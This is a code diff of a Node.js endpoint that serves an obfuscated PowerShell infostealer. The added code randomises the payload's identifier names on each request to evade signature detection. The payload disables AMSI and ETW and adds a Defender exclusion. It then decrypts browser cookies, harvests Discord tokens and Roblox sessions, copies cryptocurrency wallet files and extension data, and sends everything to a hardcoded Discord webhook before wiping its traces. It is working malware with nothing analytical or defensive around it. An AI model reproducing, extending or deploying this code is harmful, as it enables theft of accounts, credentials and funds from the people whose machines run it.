@@ -1,25 +1,32 @@
 const zlib = require('zlib');
 
-const PAYLOAD = String.raw`$ErrorActionPreference='SilentlyContinue'
+function rnd(n) {
+  const A = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  let s = '';
+  for (let i = 0; i < n; i++) s += A[Math.floor(Math.random() * A.length)];
+  return s;
+}
+
+const RAW = String.raw`$ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 $CR=[char]13;$LF=[char]10;$CRLF=$CR+$LF;$QQ=[char]34
-function u($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
-$LS = u 'TG9jYWwgU3RhdGU='
-$LD = u 'bGV2ZWxkYg=='
-$RB = u 'LlJPQkxPU0VDVVJJVFk='
-$TQ = u 'ZFF3NHc5V2dYY1E='
-$ME = u 'dXNlcnMvQG1l'
-$AT = u 'YXV0aGVudGljYXRpb24tdGlja2V0'
+function __UU($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
+$LS = __UU 'TG9jYWwgU3RhdGU='
+$LD = __UU 'bGV2ZWxkYg=='
+$RB = __UU 'LlJPQkxPU0VDVVJJVFk='
+$TQ = __UU 'ZFF3NHc5V2dYY1E='
+$ME = __UU 'dXNlcnMvQG1l'
+$AT = __UU 'YXV0aGVudGljYXRpb24tdGlja2V0'
 $wh='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
 $UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 $tmp=Join-Path $env:TEMP ('s'+[guid]::NewGuid().ToString('N').Substring(0,8))
 New-Item -ItemType Directory $tmp -Force|Out-Null
 try{Add-MpPreference -ExclusionPath $tmp -ErrorAction SilentlyContinue}catch{}
 $R=New-Object System.Text.StringBuilder
-function A($s){[void]$R.AppendLine($s)}
-function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15 -UseBasicParsing}catch{}}
-function Send($p,$n,$ct){
+function __AD($s){[void]$R.AppendLine($s)}
+function __NT($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15 -UseBasicParsing}catch{}}
+function __SN($p,$n,$ct){
  if(-not(Test-Path $p)){return}
  for($a=1;$a -le 3;$a++){
   try{
@@ -35,16 +42,16 @@ function Send($p,$n,$ct){
   }catch{Start-Sleep -Seconds (2*$a)}
  }
 }
-P ('start : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion)
+__NT ('start : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion)
 Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 1100)
-$X=$false
+$__XV=$false
 try{
 Add-Type -AssemblyName System.Security -ErrorAction Stop
 Add-Type -TypeDefinition @'
 using System;using System.Runtime.InteropServices;using System.Text;
-public class X{
- [StructLayout(LayoutKind.Sequential)]public struct D{public int cb;public IntPtr pb;}
- [DllImport("crypt32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern bool CryptUnprotectData(ref D i,IntPtr d,IntPtr e,IntPtr r,IntPtr p,uint f,ref D o);
+public class __CLS{
+ [StructLayout(LayoutKind.Sequential)]public struct __CD{public int cb;public IntPtr pb;}
+ [DllImport("crypt32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern bool CryptUnprotectData(ref __CD i,IntPtr d,IntPtr e,IntPtr r,IntPtr p,uint f,ref __CD o);
  [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
  [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
@@ -55,17 +62,17 @@ public class X{
  [DllImport("bcrypt.dll")]static extern uint BCryptDecrypt(IntPtr k,byte[] i,int il,byte[] p,byte[] n,int nl,byte[] o,int ol,out int r,uint f);
  [DllImport("bcrypt.dll")]static extern uint BCryptDestroyKey(IntPtr k);
  [DllImport("bcrypt.dll")]static extern uint BCryptCloseAlgorithmProvider(IntPtr h,uint f);
- public static void Patch(){
+ public static void __CP(){
   try{IntPtr k=LoadLibrary("amsi.dll");IntPtr a=GetProcAddress(k,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)6,0x40,out o);Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,a,6);}catch{}
   try{IntPtr n=LoadLibrary("ntdll.dll");IntPtr e=GetProcAddress(n,"EtwEventWrite");uint o;VirtualProtect(e,(UIntPtr)1,0x40,out o);Marshal.Copy(new byte[]{0xC3},0,e,1);}catch{}
  }
- public static byte[] U(byte[] b,uint f){
+ public static byte[] __CU(byte[] b,uint f){
   IntPtr i=Marshal.AllocHGlobal(b.Length);Marshal.Copy(b,0,i,b.Length);
-  D di=new D();di.cb=b.Length;di.pb=i;D o=new D();byte[] res=null;
+  __CD di=new __CD();di.cb=b.Length;di.pb=i;__CD o=new __CD();byte[] res=null;
   if(CryptUnprotectData(ref di,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,f|1,ref o)){res=new byte[o.cb];Marshal.Copy(o.pb,res,0,o.cb);}
   Marshal.FreeHGlobal(i);return res;
  }
- public static string G(byte[] key,byte[] b){
+ public static string __CG(byte[] key,byte[] b){
   IntPtr h=IntPtr.Zero,k=IntPtr.Zero;
   try{
    if(BCryptOpenAlgorithmProvider(out h,"AES",null,0)!=0)return null;
@@ -87,38 +94,38 @@ public class X{
  }
 }
 '@ -ErrorAction Stop
-try{[X]::Patch();P 'amsi : ok'}catch{}
-$X=$true
-}catch{P ('type : '+$_.Exception.Message)}
+try{[__CLS]::__CP();__NT 'amsi : ok'}catch{}
+$__XV=$true
+}catch{__NT ('type : '+$_.Exception.Message)}
 $L1=[Text.Encoding]::GetEncoding(28591)
-function KeyUser($ud){
+function __KK($ud){
  $ls=$ud+'\'+$LS;if(-not(Test-Path $ls)){return $null}
  try{$j=Get-Content $ls -Raw|ConvertFrom-Json}catch{return $null}
  if(-not $j.os_crypt.encrypted_key){return $null}
  $b=[Convert]::FromBase64String($j.os_crypt.encrypted_key);$b=$b[5..($b.Length-1)]
- try{[X]::U($b,0)}catch{$null}
+ try{[__CLS]::__CU($b,0)}catch{$null}
 }
-function KeyApp($ud){
+function __KA($ud){
  $ls=$ud+'\'+$LS;if(-not(Test-Path $ls)){return $null}
  try{$j=Get-Content $ls -Raw|ConvertFrom-Json}catch{return $null}
  if(-not $j.app_bound_encrypted_key){return $null}
  $b=[Convert]::FromBase64String($j.app_bound_encrypted_key);$b=$b[4..($b.Length-1)]
- $b=[X]::U($b,4);if(-not $b){return $null}
- try{[X]::U($b,0)}catch{$null}
+ $b=[__CLS]::__CU($b,4);if(-not $b){return $null}
+ try{[__CLS]::__CU($b,0)}catch{$null}
 }
-function Dec($val,$ku,$ka){
+function __DC($val,$ku,$ka){
  try{
   $s=$val
   switch($s.Length%4){2{$s+='=='}3{$s+='='}1{return $null}}
   $blob=[Convert]::FromBase64String($s)
   if($blob.Length -lt 35){return $null}
   $p=[Text.Encoding]::ASCII.GetString($blob[0..2])
-  if($p -eq 'v20'){if(-not $ka){return $null};return [X]::G($ka,$blob)}
-  if($p -eq 'v10' -or $p -eq 'v11'){if(-not $ku){return $null};return [X]::G($ku,$blob)}
+  if($p -eq 'v20'){if(-not $ka){return $null};return [__CLS]::__CG($ka,$blob)}
+  if($p -eq 'v10' -or $p -eq 'v11'){if(-not $ku){return $null};return [__CLS]::__CG($ku,$blob)}
   $null
  }catch{$null}
 }
-function GetCookies($db,$ku,$ka){
+function __GC($db,$ku,$ka){
  $out=@()
  if(-not(Test-Path $db)){return $out}
  $c=Join-Path $tmp ([guid]::NewGuid().ToString('N')+'.db')
@@ -126,7 +133,7 @@ function GetCookies($db,$ku,$ka){
  if(-not(Test-Path $c)){return $out}
  $txt=$L1.GetString([IO.File]::ReadAllBytes($c))
  foreach($m in [regex]::Matches($txt,'v(?:10|11|20)[A-Za-z0-9+/=]{20,}')){
-  $v=Dec $m.Value $ku $ka
+  $v=__DC $m.Value $ku $ka
   if($v){
    $st=[Math]::Max(0,$m.Index-500);$h=''
    $hs=[regex]::Matches($txt.Substring($st,$m.Index-$st),'[a-z0-9\-]{2,60}\.(com|net|org|io|xyz|app|dev|gg|tv|me|co|uk|ru|de|fr|br|info|site|online|shop|link|click|top|store|cloud|fun|live)')
@@ -137,21 +144,21 @@ function GetCookies($db,$ku,$ka){
  Remove-Item $c -Force
  $out
 }
-function GetTokens($key,$base){
+function __GT($key,$base){
  $l=$base+'\'+$LS+'\..\'+$LD;if(-not(Test-Path $l)){return @()}
  $t=@()
  foreach($f in Get-ChildItem $l -File){
   if($f.Extension -ne '.ldb' -and $f.Extension -ne '.log'){continue}
   try{$txt=$L1.GetString([IO.File]::ReadAllBytes($f.FullName))}catch{continue}
   foreach($m in [regex]::Matches($txt,($TQ+':([A-Za-z0-9+/=]{40,})'))){
-   $v=Dec $m.Groups[1].Value $key $null
+   $v=__DC $m.Groups[1].Value $key $null
    if($v -match '[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}'){$t+=$Matches[0]}
   }
   foreach($m in [regex]::Matches($txt,'[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}')){$t+=$m.Value}
  }
  $t|Select-Object -Unique
 }
-function FFCookies($db){
+function __FF($db){
  $out=@()
  if(-not(Test-Path $db)){return $out}
  try{$txt=$L1.GetString([IO.File]::ReadAllBytes($db))}catch{return $out}
@@ -161,7 +168,7 @@ function FFCookies($db){
  }
  $out|Select-Object -Unique
 }
-function FFTokens($dir){
+function __FT($dir){
  $t=@()
  if(-not(Test-Path $dir)){return $t}
  Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue|ForEach-Object{
@@ -172,7 +179,7 @@ function FFTokens($dir){
  }
  $t|Select-Object -Unique
 }
-function RB($c){
+function __RB($c){
  try{
   $s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
   $s.Cookies.Add((New-Object System.Net.Cookie($RB,$c,'/','.roblox.com')))
@@ -192,12 +199,12 @@ function RB($c){
  }catch{return $null}
 }
 try{
-A '=== SYSTEM ==='
-A ('user : {0}\{1}' -f $env:USERDOMAIN,$env:USERNAME)
-A ('host : {0}' -f $env:COMPUTERNAME)
-A ('time : {0:u}' -f (Get-Date))
-try{A ('ip   : {0}' -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10 -UseBasicParsing))}catch{}
-A ''
+__AD '=== SYSTEM ==='
+__AD ('user : {0}\{1}' -f $env:USERDOMAIN,$env:USERNAME)
+__AD ('host : {0}' -f $env:COMPUTERNAME)
+__AD ('time : {0:u}' -f (Get-Date))
+try{__AD ('ip   : {0}' -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10 -UseBasicParsing))}catch{}
+__AD ''
 $L=$env:LOCALAPPDATA;$AP=$env:APPDATA
 $B=@(
  @{n='Chrome';p=$L+'\Google\Chrome\User Data'},
@@ -224,39 +231,39 @@ $allCk=@();$allTk=@()
 foreach($b in $B){
  if(-not(Test-Path $b.p)){continue}
  $ku=$null;$ka=$null
- if($X){$ku=KeyUser $b.p;$ka=KeyApp $b.p}
+ if($__XV){$ku=__KK $b.p;$ka=__KA $b.p}
  $profs=@($b.p)
  Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{$profs+=$_.FullName}
  foreach($pr in ($profs|Select-Object -Unique)){
   foreach($rel in @($pr+'\Network\Cookies',$pr+'\Cookies')){
-   foreach($c in (GetCookies $rel $ku $ka)){$allCk+=[pscustomobject]@{B=$b.n;H=$c.H;V=$c.V}}
+   foreach($c in (__GC $rel $ku $ka)){$allCk+=[pscustomobject]@{B=$b.n;H=$c.H;V=$c.V}}
   }
-  foreach($t in (GetTokens $ku $pr)){$allTk+=$t}
+  foreach($t in (__GT $ku $pr)){$allTk+=$t}
  }
 }
-P ('stage : chromium '+$allCk.Count)
+__NT ('stage : chromium '+$allCk.Count)
 $F=@($AP+'\Mozilla\Firefox\Profiles',$AP+'\zen\Profiles',$AP+'\librewolf\Profiles',$AP+'\Waterfox\Profiles',$AP+'\floorp\Profiles')
 foreach($fd in $F){
  if(-not(Test-Path $fd)){continue}
  Get-ChildItem $fd -Directory -ErrorAction SilentlyContinue|ForEach-Object{
-  foreach($c in (FFCookies ($_.FullName+'\cookies.sqlite'))){$allCk+=[pscustomobject]@{B='Firefox';H='.roblox.com';V=$c}}
-  foreach($t in (FFTokens ($_.FullName+'\storage\default'))){$allTk+=$t}
+  foreach($c in (__FF ($_.FullName+'\cookies.sqlite'))){$allCk+=[pscustomobject]@{B='Firefox';H='.roblox.com';V=$c}}
+  foreach($t in (__FT ($_.FullName+'\storage\default'))){$allTk+=$t}
  }
 }
-P ('stage : gecko '+$allCk.Count)
+__NT ('stage : gecko '+$allCk.Count)
 foreach($d in @('discord','discordptb','discordcanary')){
  $dd=$AP+'\'+$d
- if(Test-Path $dd){$k=$null;if($X){$k=KeyUser $dd};foreach($t in (GetTokens $k $dd)){$allTk+=$t}}
+ if(Test-Path $dd){$k=$null;if($__XV){$k=__KK $dd};foreach($t in (__GT $k $dd)){$allTk+=$t}}
 }
 $allTk=$allTk|Where-Object{$_}|Select-Object -Unique
 $ck=$allCk|Where-Object{$_.V}|Select-Object -Unique
-P ('stage : found '+$allTk.Count+' tk / '+$ck.Count+' ck')
+__NT ('stage : found '+$allTk.Count+' tk / '+$ck.Count+' ck')
 $tokOut=@();$ckOut=@()
 foreach($t in $allTk){
  try{
   $uu=Invoke-RestMethod ('https://discord.com/api/v9/'+$ME) -Headers @{Authorization=$t;'User-Agent'=$UA} -TimeoutSec 12 -UseBasicParsing
   $line=('{0}#{1} | {2} | id {3} | 2fa {4}' -f $uu.username,$uu.discriminator,$uu.email,$uu.id,$uu.mfa_enabled)
-  A $line;A ('TOKEN: {0}' -f $t);A ''
+  __AD $line;__AD ('TOKEN: {0}' -f $t);__AD ''
   $tokOut+=$line;('TOKEN: '+$t);''
  }catch{}
 }
@@ -264,52 +271,61 @@ if(-not $tokOut.Count){$tokOut+='none found'}
 $seen=@()
 foreach($c in ($ck|Where-Object{$_.H -like '*roblox*'})){
  if($seen -contains $c.V){continue};$seen+=$c.V
- $x=RB $c.V
+ $x=__RB $c.V
  if($x){
-  A ('USER : {0} (id {1}) | robux {2}' -f $x.u.name,$x.u.id,$x.r)
-  A ('COOKIE (IP-bypassed): {0}' -f $x.c)
-  A ('ORIGINAL [{0}]: {1}' -f $c.B,$c.V);A ''
+  __AD ('USER : {0} (id {1}) | robux {2}' -f $x.u.name,$x.u.id,$x.r)
+  __AD ('COOKIE (IP-bypassed): {0}' -f $x.c)
+  __AD ('ORIGINAL [{0}]: {1}' -f $c.B,$c.V);__AD ''
   $ckOut+=('USER : {0} (id {1}) | robux {2} [{3}]' -f $x.u.name,$x.u.id,$x.r,$c.B)
   $ckOut+=('FRESH : '+$x.c);$ckOut+=('RAW   : '+$c.V);$ckOut+=''
  }
 }
 if(-not $seen.Count){$ckOut+='no roblox cookie found'}
-A '=== ALL COOKIES ==='
-foreach($c in $ck){A ('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V);$ckOut+=('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V)}
+__AD '=== ALL COOKIES ==='
+foreach($c in $ck){__AD ('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V);$ckOut+=('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V)}
 $tkTxt=Join-Path $tmp 'tokens.txt';$ckTxt=Join-Path $tmp 'cookies.txt'
 $tokOut|Set-Content $tkTxt -Encoding UTF8
 $ckOut|Set-Content $ckTxt -Encoding UTF8
 $wdir=Join-Path $tmp 'w';New-Item -ItemType Directory $wdir -Force|Out-Null
 $wp=@($AP+'\Exodus\exodus.wallet',$AP+'\Electrum\wallets',$AP+'\atomic\Local Storage\leveldb',$AP+'\Coinbase',$AP+'\Trust Wallet',$AP+'\Phantom',$L+'\Phantom',$AP+'\Binance',$AP+'\Ledger Live',$AP+'\Wasabi Wallet',$AP+'\Bitcoin\wallets',$AP+'\Ethereum\keystore',$AP+'\Coin98',$AP+'\Solflare',$AP+'\Guarda')
 $exts=@{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Trust='egjidjbpglichdcondbcbdnbeeppgdph';Coinbase='hnlfjmpnagjnfpkljghhgnpmlpcoimja';Binance='fhbohimaelbohpjbbldcngcnapndodjp';Keplr='dmkamcknogkgcdfhhbddcghachkejeap';Solflare='bhhhlbepdkbapadjdnnojkbgioiodbic';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec';Yoroi='ffnlbdhecaflocmhejdebcbfcbjjljhd';Nami='lpfcbjgnfdnmbafgjonjliakdjobofnk'}
-A '';A '=== WALLETS ==='
-foreach($p in $wp){if(Test-Path $p){Copy-Item $p (Join-Path $wdir ([IO.Path]::GetFileName($p))) -Recurse -Force;A ('dir  : {0}' -f $p)}}
+__AD '';__AD '=== WALLETS ==='
+foreach($p in $wp){if(Test-Path $p){Copy-Item $p (Join-Path $wdir ([IO.Path]::GetFileName($p))) -Recurse -Force;__AD ('dir  : {0}' -f $p)}}
 foreach($b in $B){
  if(-not(Test-Path $b.p)){continue}
  Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{
   foreach($k in $exts.Keys){
    $src=$_.FullName+'\'+$LS+'\..\'+$exts[$k]
-   if(Test-Path $src){Copy-Item $src (Join-Path $wdir ('ext_'+$k+'_'+$b.n)) -Recurse -Force;A ('ext  : {0} [{1}]' -f $k,$b.n)}
+   if(Test-Path $src){Copy-Item $src (Join-Path $wdir ('ext_'+$k+'_'+$b.n)) -Recurse -Force;__AD ('ext  : {0} [{1}]' -f $k,$b.n)}
   }
  }
 }
 $rp=Join-Path $tmp 'report.txt';$R.ToString()|Set-Content $rp -Encoding UTF8
 $zp=Join-Path $tmp 'wallets.zip'
 try{Compress-Archive ($wdir+'\*') $zp -Force -ErrorAction Stop}catch{}
-P 'stage : send'
-Send $rp ('report-'+$env:COMPUTERNAME+'.txt') 'text/plain'
-Send $tkTxt ('tokens-'+$env:COMPUTERNAME+'.txt') 'text/plain'
-Send $ckTxt ('cookies-'+$env:COMPUTERNAME+'.txt') 'text/plain'
-Send $zp 'wallets.zip' 'application/zip'
-P 'done'
-}catch{P ('ERR: '+$_.Exception.Message+' (line '+$_.InvocationInfo.ScriptLineNumber+')')}
+__NT 'stage : send'
+__SN $rp ('report-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+__SN $tkTxt ('tokens-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+__SN $ckTxt ('cookies-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+__SN $zp 'wallets.zip' 'application/zip'
+__NT 'done'
+}catch{__NT ('ERR: '+$_.Exception.Message+' (line '+$_.InvocationInfo.ScriptLineNumber+')')}
 Start-Sleep 2
 Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue`;
 
+function build() {
+  const keys = ['NT','SN','AD','UU','KK','KA','DC','GC','GT','FF','FT','RB','CLS','CU','CA','CG','CP','CD'];
+  let p = RAW;
+  for (const k of keys) {
+    p = p.split('__' + k).join(rnd(7) + String.fromCharCode(97 + Math.floor(Math.random() * 26)));
+  }
+  return p;
+}
+
 module.exports = (req, res) => {
-  const b = zlib.deflateRawSync(Buffer.from(PAYLOAD, 'utf8'));
+  const b = zlib.deflateRawSync(Buffer.from(build(), 'utf8'));
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  res.setHeader('Cache-Control', 'no-store, max-age=0');
+  res.setHeader('Cache-Control', 'no-store, max-age=0, must-revalidate');
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.status(200).send(b.toString('base64'));
 };
